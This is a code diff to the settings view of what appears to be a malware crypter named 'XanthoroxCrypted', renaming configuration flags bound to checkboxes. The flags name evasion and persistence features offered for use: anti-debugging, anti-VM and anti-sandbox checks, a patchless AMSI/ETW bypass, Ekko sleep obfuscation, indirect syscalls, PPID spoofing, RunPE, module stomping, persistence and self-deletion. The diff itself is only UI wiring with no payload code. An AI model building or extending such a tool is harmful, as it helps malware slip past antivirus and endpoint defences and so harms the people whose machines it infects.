@@ -204,19 +204,18 @@ namespace XanthoroxCrypted.Views
                         config.AntiDebug   = ChkAntiDebug.IsChecked == true;
                         config.AntiVM      = ChkAntiVM.IsChecked == true;
                         config.AntiSandbox = ChkAntiSandbox.IsChecked == true;
-                        config.AMSI        = ChkAMSI.IsChecked == true;
-                        config.ETW         = ChkETW.IsChecked == true;
+                        config.PatchlessAmsiEtw = ChkAMSI.IsChecked == true || ChkETW.IsChecked == true;
                         config.Fibers      = ChkFibers.IsChecked == true;
                         config.RunPE       = ChkRunPE.IsChecked == true;
                         config.ModuleStomp = ChkModuleStomp.IsChecked == true;
                         config.Persist     = ChkPersist.IsChecked == true;
                         config.Melt        = ChkMelt.IsChecked == true;
                         config.FakeError   = ChkFakeError.IsChecked == true;
-                        config.SleepObf    = ChkSleepObf.IsChecked == true;
+                        config.EkkoSleep   = ChkSleepObf.IsChecked == true;
                         config.PPIDSpoof   = ChkPPIDSpoof.IsChecked == true;
                         config.EntropyNorm = doEntropy;
                         // L11-L16 toggles
-                        config.Syscalls    = ChkSyscalls.IsChecked == true;
+                        config.IndirectSyscalls = ChkSyscalls.IsChecked == true;
                         config.ThreadPool  = ChkThreadPool.IsChecked == true;
                         config.GuardPage   = ChkGuardPage.IsChecked == true;
                         config.HWIDBind    = ChkHWIDBind.IsChecked == true;
@@ -315,8 +314,8 @@ namespace XanthoroxCrypted.Views
             ChkAntiSandbox.IsChecked = config.AntiSandbox;
 
             // Telemetry
-            ChkAMSI.IsChecked = config.AMSI;
-            ChkETW.IsChecked  = config.ETW;
+            ChkAMSI.IsChecked = config.PatchlessAmsiEtw;
+            ChkETW.IsChecked  = config.PatchlessAmsiEtw;
 
             // Execution
             ChkFibers.IsChecked      = config.Fibers;
@@ -329,12 +328,12 @@ namespace XanthoroxCrypted.Views
             ChkFakeError.IsChecked = config.FakeError;
 
             // Advanced evasion
-            ChkSleepObf.IsChecked    = config.SleepObf;
+            ChkSleepObf.IsChecked    = config.EkkoSleep;
             ChkPPIDSpoof.IsChecked   = config.PPIDSpoof;
             ChkEntropyNorm.IsChecked = config.EntropyNorm;
 
             // New L11-L16 toggles
-            ChkSyscalls.IsChecked    = config.Syscalls;
+            ChkSyscalls.IsChecked    = config.IndirectSyscalls;
             ChkThreadPool.IsChecked  = config.ThreadPool;
             ChkGuardPage.IsChecked   = config.GuardPage;
             ChkHWIDBind.IsChecked    = config.HWIDBind;
